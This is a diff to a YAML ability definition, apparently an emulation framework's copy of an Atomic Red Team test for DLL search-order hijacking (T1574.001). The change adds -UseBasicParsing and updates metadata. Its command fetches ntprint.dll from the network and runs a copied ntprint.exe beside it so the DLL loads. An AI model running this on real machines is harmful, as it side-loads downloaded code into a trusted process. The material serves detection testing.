@@ -20,8 +20,8 @@
         command: 'if (Test-Path "PathToAtomicsFolder\T1574.001\bin\ntprint.dll") {exit
           0} else {exit 1}; then : ; else New-Item -Type Directory (split-path "PathToAtomicsFolder\T1574.001\bin\ntprint.dll")
           -ErrorAction ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/ntprint.dll?raw=true"
-          -OutFile "PathToAtomicsFolder\T1574.001\bin\ntprint.dll"; fi; mkdir "%USERPROFILE%\atomic";
-          cd "%USERPROFILE%\atomic"; copy "PathToAtomicsFolder\T1574.001\bin\ntprint.dll"
+          -OutFile "PathToAtomicsFolder\T1574.001\bin\ntprint.dll" -UseBasicParsing;
+          fi; mkdir "%USERPROFILE%\atomic"; cd "%USERPROFILE%\atomic"; copy "PathToAtomicsFolder\T1574.001\bin\ntprint.dll"
           .; copy /y C:\Windows\System32\ntprint.exe .; ntprint.exe PSetupElevatedLegacyPrintDriverInstallW
           {}'
         cleanup: cd "%USERPROFILE%"; rmdir /s /q "%USERPROFILE%\atomic"
@@ -32,8 +32,8 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
   - execution
+  - atomic-red-team
   - t1574.001
   author: Atomic Red Team
   additional_info:
@@ -51,7 +51,7 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1574.001/bin/ntprint.dll?raw=true"
-        -OutFile "#{ntprint_dll_file}"'
+        -OutFile "#{ntprint_dll_file}" -UseBasicParsing'
     technique_created: '2020-03-13T18:11:08.357Z'
     atomic_guid: e96b8105-d7f7-484e-8d81-2d0c7086971b
-    import_timestamp: '2026-10-20T07:08:27.771741Z'
+    import_timestamp: '2026-10-21T07:01:50.365998Z'
